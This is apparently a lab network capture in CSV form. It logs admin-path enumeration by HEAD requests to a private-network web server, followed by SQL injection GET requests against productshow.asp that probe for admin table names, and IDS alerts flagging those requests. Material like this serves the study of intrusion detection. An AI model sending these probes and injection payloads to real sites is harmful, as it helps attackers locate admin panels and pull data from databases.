timestamp,msg,ip_src,src_port,ip_dst,dst_port
2019/03/24 15:34:55.249900,"HEAD /cadmins HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56570,192.168.244.136,80
2019/03/24 15:34:55.255687,"HEAD /ccp14admin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56588,192.168.244.136,80
2019/03/24 15:34:55.258713,"HEAD /ceoadmin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56590,192.168.244.136,80
2019/03/24 15:34:55.268309,"HEAD /chkadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56581,192.168.244.136,80
2019/03/24 15:34:55.271582,"HEAD /cmsadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56585,192.168.244.136,80
2019/03/24 15:34:55.288163,"HEAD /count_admin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56588,192.168.244.136,80
2019/03/24 15:34:55.301454,"HEAD /database_administration HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56590,192.168.244.136,80
2019/03/24 15:34:55.309304,"HEAD /denglu/admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56568,192.168.244.136,80
2019/03/24 15:34:55.311351,"HEAD /directadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56581,192.168.244.136,80
2019/03/24 15:34:55.327024,"HEAD /eadmin/login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56584,192.168.244.136,80
2019/03/24 15:34:55.328452,"HEAD /edit/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56538,192.168.244.136,80
2019/03/24 15:34:55.329749,"HEAD /editor/admin_login.asp? HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56585,192.168.244.136,80
2019/03/24 15:34:55.335302,"HEAD /esuperadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56570,192.168.244.136,80
2019/03/24 15:34:55.337429,"HEAD /eWeb/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56583,192.168.244.136,80
2019/03/24 15:34:55.399376,"HEAD /eWebEditor_v280_Free/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56538,192.168.244.136,80
2019/03/24 15:34:55.401329,"HEAD /ezsqliteadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56562,192.168.244.136,80
2019/03/24 15:34:55.409320,"HEAD /fileadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56585,192.168.244.136,80
2019/03/24 15:34:55.409341,"HEAD /fileadmin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56586,192.168.244.136,80
2019/03/24 15:34:55.409347,"HEAD /fileadmin.html HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56588,192.168.244.136,80
2019/03/24 15:34:55.409840,"HEAD /fileadmin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56589,192.168.244.136,80
2019/03/24 15:34:55.417211,"HEAD /fpv_admin/admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56565,192.168.244.136,80
2019/03/24 15:34:55.423520,"HEAD /g_admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56585,192.168.244.136,80
2019/03/24 15:34:55.431970,"HEAD /gl/adminlogin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56581,192.168.244.136,80
2019/03/24 15:34:55.432651,"HEAD /gladmin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56583,192.168.244.136,80
2019/03/24 15:34:55.433456,"HEAD /gladmin.aspx HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56582,192.168.244.136,80
2019/03/24 15:34:55.433464,"HEAD /gladmin.jsp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56584,192.168.244.136,80
2019/03/24 15:34:55.434265,"HEAD /gladmin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56585,192.168.244.136,80
2019/03/24 15:34:55.434465,"HEAD /gladmin/login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56586,192.168.244.136,80
2019/03/24 15:34:55.436957,"HEAD /globes_admin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56598,192.168.244.136,80
2019/03/24 15:34:55.446796,"HEAD /guanli/admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56568,192.168.244.136,80
2019/03/24 15:34:55.448493,"HEAD /guanliadmin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56583,192.168.244.136,80
2019/03/24 15:34:55.448628,"HEAD /guanliadmin.jsp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56584,192.168.244.136,80
2019/03/24 15:34:55.484227,"HEAD /houtai/admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56538,192.168.244.136,80
2019/03/24 15:34:55.492188,"HEAD /hpwebjetadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56562,192.168.244.136,80
2019/03/24 15:34:55.492193,"HEAD /Hradmin/admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56561,192.168.244.136,80
2019/03/24 15:34:55.492227,"HEAD /htmedit/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56581,192.168.244.136,80
2019/03/24 15:34:55.495828,"HEAD /inadmin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56532,192.168.244.136,80
2019/03/24 15:34:55.499046,"HEAD /index_admin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56568,192.168.244.136,80
2019/03/24 15:34:55.500106,"HEAD /indexadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56581,192.168.244.136,80
2019/03/24 15:34:55.502007,"HEAD /Indy_admin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56584,192.168.244.136,80
2019/03/24 15:34:55.505189,"HEAD /inforadmin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56591,192.168.244.136,80
2019/03/24 15:34:55.505207,"HEAD /infos_admin/ HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56598,192.168.244.136,80
2019/03/24 15:34:55.509918,"HEAD /irc-macadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56532,192.168.244.136,80
2019/03/24 15:34:55.519621,"HEAD /link/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56588,192.168.244.136,80
2019/03/24 15:34:55.607249,"HEAD /login/admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56570,192.168.244.136,80
2019/03/24 15:34:55.607261,"HEAD /login/admin/admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56581,192.168.244.136,80
2019/03/24 15:34:55.622618,"HEAD /logo_sysadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56583,192.168.244.136,80
2019/03/24 15:34:55.622649,"HEAD /lyb/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56591,192.168.244.136,80
2019/03/24 15:34:55.622658,"HEAD /macadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56598,192.168.244.136,80
2019/03/24 15:34:55.625319,"HEAD /manage/admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56569,192.168.244.136,80
2019/03/24 15:34:55.629683,"HEAD /manage/admin_index.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56581,192.168.244.136,80
2019/03/24 15:34:55.629692,"HEAD /manage/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56583,192.168.244.136,80
2019/03/24 15:34:55.629701,"HEAD /manage/Edit/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56584,192.168.244.136,80
2019/03/24 15:34:55.629716,"HEAD /manage/Editor/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56562,192.168.244.136,80
2019/03/24 15:34:55.630485,"HEAD /manage/eweb/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56565,192.168.244.136,80
2019/03/24 15:34:55.631415,"HEAD /manage/eWebEditor/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56586,192.168.244.136,80
2019/03/24 15:34:55.632521,"HEAD /manage/eWebEditor_v280_Free/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56591,192.168.244.136,80
2019/03/24 15:34:55.634273,"HEAD /manage/htmedit/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56570,192.168.244.136,80
2019/03/24 15:34:55.636162,"HEAD /manage/WebEdit/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56584,192.168.244.136,80
2019/03/24 15:34:55.638303,"HEAD /manage/WebEditor/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56603,192.168.244.136,80
2019/03/24 15:34:55.643348,"HEAD /manager/admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56605,192.168.244.136,80
2019/03/24 15:34:55.644641,"HEAD /manager/admin/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56588,192.168.244.136,80
2019/03/24 15:34:55.645375,"HEAD /manager/admin_index.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56532,192.168.244.136,80
2019/03/24 15:34:55.645787,"HEAD /manager/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56569,192.168.244.136,80
2019/03/24 15:34:55.654594,"HEAD /member/admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56604,192.168.244.136,80
2019/03/24 15:34:55.667032,"HEAD /moderator/admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56552,192.168.244.136,80
2019/03/24 15:34:55.667384,"HEAD /moderator/admin.html HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56570,192.168.244.136,80
2019/03/24 15:34:55.667857,"HEAD /moderator/admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56599,192.168.244.136,80
2019/03/24 15:34:55.674988,"HEAD /myadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56607,192.168.244.136,80
2019/03/24 15:34:55.678488,"HEAD /new/admin_index.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56569,192.168.244.136,80
2019/03/24 15:34:55.681457,"HEAD /news/admin/default.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56602,192.168.244.136,80
2019/03/24 15:34:55.681642,"HEAD /news/admin/upfile.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56562,192.168.244.136,80
2019/03/24 15:34:55.682636,"HEAD /news/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56565,192.168.244.136,80
2019/03/24 15:34:55.684147,"HEAD /news/newadmin/ HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56603,192.168.244.136,80
2019/03/24 15:34:55.684155,"HEAD /news/newadmin/test.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56604,192.168.244.136,80
2019/03/24 15:34:55.685502,"HEAD /newsadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56552,192.168.244.136,80
2019/03/24 15:34:55.697991,"HEAD /openvpnadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56581,192.168.244.136,80
2019/03/24 15:34:55.701743,"HEAD /pgadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56605,192.168.244.136,80
2019/03/24 15:34:55.706044,"HEAD /phpldapadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56565,192.168.244.136,80
2019/03/24 15:34:55.707086,"HEAD /phpmyadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56568,192.168.244.136,80
2019/03/24 15:34:55.707859,"HEAD /phppgadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56569,192.168.244.136,80
2019/03/24 15:34:55.724636,"HEAD /project-admins HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56591,192.168.244.136,80
2019/03/24 15:34:55.729382,"HEAD /pureadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56568,192.168.244.136,80
2019/03/24 15:34:55.730632,"HEAD /radmind HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56581,192.168.244.136,80
2019/03/24 15:34:55.730639,"HEAD /radmind-1 HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56583,192.168.244.136,80
2019/03/24 15:34:55.746868,"HEAD /server_admin_small HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56532,192.168.244.136,80
2019/03/24 15:34:55.759484,"HEAD /soft_admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56532,192.168.244.136,80
2019/03/24 15:34:55.760195,"HEAD /soft_admin.aspx HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56552,192.168.244.136,80
2019/03/24 15:34:55.760706,"HEAD /soft_admin.jsp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56562,192.168.244.136,80
2019/03/24 15:34:55.763576,"HEAD /sql-admin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56583,192.168.244.136,80
2019/03/24 15:34:55.764947,"HEAD /ss_vms_admin_sm HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56591,192.168.244.136,80
2019/03/24 15:34:55.764955,"HEAD /sshadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56598,192.168.244.136,80
2019/03/24 15:34:55.765437,"HEAD /staradmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56599,192.168.244.136,80
2019/03/24 15:34:55.778062,"HEAD /sxadmin/index.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56599,192.168.244.136,80
2019/03/24 15:34:55.779692,"HEAD /sys/admin/login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56565,192.168.244.136,80
2019/03/24 15:34:55.782777,"HEAD /sys-admin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56581,192.168.244.136,80
2019/03/24 15:34:55.783137,"HEAD /sysadmin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56583,192.168.244.136,80
2019/03/24 15:34:55.783487,"HEAD /sysadmin.html HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56584,192.168.244.136,80
2019/03/24 15:34:55.783897,"HEAD /sysadmin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56591,192.168.244.136,80
2019/03/24 15:34:55.785053,"HEAD /sysadmins HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56604,192.168.244.136,80
2019/03/24 15:34:55.785727,"HEAD /sysadmins.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56605,192.168.244.136,80
2019/03/24 15:34:55.796875,"HEAD /system_administration HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56591,192.168.244.136,80
2019/03/24 15:34:55.796885,"HEAD /system-administration HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56599,192.168.244.136,80
2019/03/24 15:34:55.800438,"HEAD /szwyadmin/login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56565,192.168.244.136,80
2019/03/24 15:34:55.800788,"HEAD /tacforo/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56606,192.168.244.136,80
2019/03/24 15:34:55.811190,"HEAD /toucher/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56598,192.168.244.136,80
2019/03/24 15:34:55.812831,"HEAD /trade/admin/Login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56588,192.168.244.136,80
2019/03/24 15:34:55.814854,"HEAD /union/admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56568,192.168.244.136,80
2019/03/24 15:34:55.822070,"HEAD /ur-admin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56605,192.168.244.136,80
2019/03/24 15:34:55.822497,"HEAD /ur-admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56606,192.168.244.136,80
2019/03/24 15:34:55.822899,"HEAD /ur-admin.html HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56603,192.168.244.136,80
2019/03/24 15:34:55.823392,"HEAD /ur-admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56604,192.168.244.136,80
2019/03/24 15:34:55.825735,"HEAD /user/admin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56565,192.168.244.136,80
2019/03/24 15:34:55.830672,"HEAD /useradmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56599,192.168.244.136,80
2019/03/24 15:34:55.834167,"HEAD /vadmind HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56604,192.168.244.136,80
2019/03/24 15:34:55.839231,"HEAD /vmailadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56532,192.168.244.136,80
2019/03/24 15:34:55.868861,"HEAD /webadmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56532,192.168.244.136,80
2019/03/24 15:34:55.872639,"HEAD /webadmin.html HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56562,192.168.244.136,80
2019/03/24 15:34:55.874167,"HEAD /webadmin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56532,192.168.244.136,80
2019/03/24 15:34:55.877779,"HEAD /webedit/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56565,192.168.244.136,80
2019/03/24 15:34:55.877791,"HEAD /webedit1/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56569,192.168.244.136,80
2019/03/24 15:34:55.877810,"HEAD /WebEditor/admin_login.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56583,192.168.244.136,80
2019/03/24 15:34:55.877861,"HEAD /wizmysqladmin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56603,192.168.244.136,80
2019/03/24 15:34:55.878790,"HEAD /wp-admin HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56532,192.168.244.136,80
2019/03/24 15:34:55.890215,"HEAD /admin_move/ HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56606,192.168.244.136,80
2019/03/24 15:34:55.890941,"HEAD /basedadmin/ HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56562,192.168.244.136,80
2019/03/24 15:34:55.892839,"HEAD /basedadmin.asp HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56568,192.168.244.136,80
2019/03/24 15:34:55.893282,"HEAD /g_admin/ HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56569,192.168.244.136,80
2019/03/24 15:34:55.893486,"HEAD /Indy_admin/ HTTP/1.1
Host: 192.168.244.136

",192.168.244.1,56581,192.168.244.136,80
2019/03/24 15:35:25.988451 ,ET ASP SQL Injection Attempt,192.168.244.1,56643,192.168.244.136,80
2019/03/24 15:35:28.046057,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56644,192.168.244.136,80
2019/03/24 15:35:28.046057 ,ET ASP SQL Injection Attempt,192.168.244.1,56644,192.168.244.136,80
2019/03/24 15:35:28.132256,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20a_admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56645,192.168.244.136,80
2019/03/24 15:35:28.132256 ,ET ASP SQL Injection Attempt,192.168.244.1,56645,192.168.244.136,80
2019/03/24 15:35:28.189967,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20x_admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56646,192.168.244.136,80
2019/03/24 15:35:28.189967 ,ET ASP SQL Injection Attempt,192.168.244.1,56646,192.168.244.136,80
2019/03/24 15:35:28.251411,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20m_admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56647,192.168.244.136,80
2019/03/24 15:35:28.251411 ,ET ASP SQL Injection Attempt,192.168.244.1,56647,192.168.244.136,80
2019/03/24 15:35:28.313899,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20adminuser) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56648,192.168.244.136,80
2019/03/24 15:35:28.313899 ,ET ASP SQL Injection Attempt,192.168.244.1,56648,192.168.244.136,80
2019/03/24 15:35:28.376682,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20admin_user) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56649,192.168.244.136,80
2019/03/24 15:35:28.376682 ,ET ASP SQL Injection Attempt,192.168.244.1,56649,192.168.244.136,80
2019/03/24 15:35:28.439714,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20article_admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56650,192.168.244.136,80
2019/03/24 15:35:28.439714 ,ET ASP SQL Injection Attempt,192.168.244.1,56650,192.168.244.136,80
2019/03/24 15:35:28.501594,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20administrator) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56651,192.168.244.136,80
2019/03/24 15:35:28.501594 ,ET ASP SQL Injection Attempt,192.168.244.1,56651,192.168.244.136,80
2019/03/24 15:35:28.564135 ,ET ASP SQL Injection Attempt,192.168.244.1,56652,192.168.244.136,80
2019/03/24 15:35:28.626260 ,ET ASP SQL Injection Attempt,192.168.244.1,56653,192.168.244.136,80
2019/03/24 15:35:28.690040 ,ET ASP SQL Injection Attempt,192.168.244.1,56654,192.168.244.136,80
2019/03/24 15:35:28.750562 ,ET ASP SQL Injection Attempt,192.168.244.1,56655,192.168.244.136,80
2019/03/24 15:35:28.831552 ,ET ASP SQL Injection Attempt,192.168.244.1,56656,192.168.244.136,80
2019/03/24 15:35:28.911944 ,ET ASP SQL Injection Attempt,192.168.244.1,56657,192.168.244.136,80
2019/03/24 15:35:28.971244 ,ET ASP SQL Injection Attempt,192.168.244.1,56658,192.168.244.136,80
2019/03/24 15:35:29.032828 ,ET ASP SQL Injection Attempt,192.168.244.1,56659,192.168.244.136,80
2019/03/24 15:35:29.094611,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20admin_userinfo) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56660,192.168.244.136,80
2019/03/24 15:35:29.094611 ,ET ASP SQL Injection Attempt,192.168.244.1,56660,192.168.244.136,80
2019/03/24 15:35:29.158027 ,ET ASP SQL Injection Attempt,192.168.244.1,56661,192.168.244.136,80
2019/03/24 15:35:29.219348 ,ET ASP SQL Injection Attempt,192.168.244.1,56662,192.168.244.136,80
2019/03/24 15:35:29.283503 ,ET ASP SQL Injection Attempt,192.168.244.1,56663,192.168.244.136,80
2019/03/24 15:35:29.344680 ,ET ASP SQL Injection Attempt,192.168.244.1,56664,192.168.244.136,80
2019/03/24 15:35:29.408301 ,ET ASP SQL Injection Attempt,192.168.244.1,56665,192.168.244.136,80
2019/03/24 15:35:29.469718 ,ET ASP SQL Injection Attempt,192.168.244.1,56666,192.168.244.136,80
2019/03/24 15:35:29.533845 ,ET ASP SQL Injection Attempt,192.168.244.1,56667,192.168.244.136,80
2019/03/24 15:35:29.594548 ,ET ASP SQL Injection Attempt,192.168.244.1,56668,192.168.244.136,80
2019/03/24 15:35:29.676855 ,ET ASP SQL Injection Attempt,192.168.244.1,56669,192.168.244.136,80
2019/03/24 15:35:29.755293 ,ET ASP SQL Injection Attempt,192.168.244.1,56670,192.168.244.136,80
2019/03/24 15:35:29.814116 ,ET ASP SQL Injection Attempt,192.168.244.1,56671,192.168.244.136,80
2019/03/24 15:35:29.875913 ,ET ASP SQL Injection Attempt,192.168.244.1,56672,192.168.244.136,80
2019/03/24 15:35:29.939654 ,ET ASP SQL Injection Attempt,192.168.244.1,56673,192.168.244.136,80
2019/03/24 15:35:30.001500 ,ET ASP SQL Injection Attempt,192.168.244.1,56674,192.168.244.136,80
2019/03/24 15:35:30.065287 ,ET ASP SQL Injection Attempt,192.168.244.1,56675,192.168.244.136,80
2019/03/24 15:35:30.126443,"GET /productshow.asp?id=9%20and%20exists%20(select%20*%20from%20dv_admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56676,192.168.244.136,80
2019/03/24 15:35:30.126443 ,ET ASP SQL Injection Attempt,192.168.244.1,56676,192.168.244.136,80
2019/03/24 15:35:30.189593 ,ET ASP SQL Injection Attempt,192.168.244.1,56677,192.168.244.136,80
2019/03/24 15:35:35.300298,"GET /productshow.asp?id=9%20and%20exists%20(select%20username%20from%20admin) HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)
Host: 192.168.244.136
Cookie: ASPSESSIONIDQSSSAQDC=FKKBOPBCPLCLIFHPIEBFKJKJ; ASPSESSIONIDCSTDTTBT=FGNPIJJDPDAFEPAMGKNCGAHK

",192.168.244.1,56678,192.168.244.136,80
